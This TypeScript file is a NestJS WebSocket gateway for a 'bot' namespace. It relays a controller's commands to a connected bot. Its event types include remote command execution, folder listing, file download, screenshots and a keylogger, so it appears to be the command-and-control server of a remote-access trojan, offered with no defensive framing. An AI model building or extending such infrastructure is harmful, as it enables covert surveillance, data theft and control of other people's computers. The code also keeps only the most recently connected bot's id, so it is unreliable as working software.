import {
  OnGatewayConnection,
  OnGatewayDisconnect,
  SubscribeMessage,
  WebSocketGateway,
  WebSocketServer,
} from "@nestjs/websockets";
import { Server, Socket } from "socket.io";
import { WsBotJoinsUseCase } from "../application/ws-bot-joins.use-case";
import { WsBotLeavesUseCase } from "../application/ws-bot-leaves.use-case";

type BotEvents =
  | "connectedClient"
  | "disconnectedClient"
  | "sendScreensToBot"
  | "sendScreenshotToBot"
  | "message"
  | "getCmdCommand"
  | "getFilesFolder"
  | "downloadFile"
  | "addFriend"
  | "sendKeyLogger";

@WebSocketGateway({
  namespace: "bot",
  cors: true,
  maxHttpBufferSize: 1e8,
})
export class WsBotGateway implements OnGatewayConnection, OnGatewayDisconnect {
  constructor(
    private readonly wsBotJoinsUseCase: WsBotJoinsUseCase,
    private readonly wsBotLeavesUseCase: WsBotLeavesUseCase,
  ) {}

  @WebSocketServer()
  server!: Server;

  private botid: string = "";

  afterInit(client: Socket) {}

  async sendEventToBot(controllerid: string, event: BotEvents, payload?: any) {
    // const client = this.server.sockets.sockets.get(clientid);
    // console.log("client", client);
    // if (client) {
    //   client.emit(event, payload);
    // }

    console.log("message to bot", controllerid, event);
    this.server.to(this.botid).emit(event, {
      ...payload,
      controllerid,
    });
  }

  async handleConnection(client: Socket) {
    try {
      await this.wsBotJoinsUseCase.execute(client);
      this.botid = client.id;
      // await this.clientJoinsUseCase.execute()
    } catch (error) {
      // console.error("Connection error:", error);
      client.disconnect();
    }
  }

  handleDisconnect(client: Socket) {
    this.wsBotLeavesUseCase.execute();
  }
}
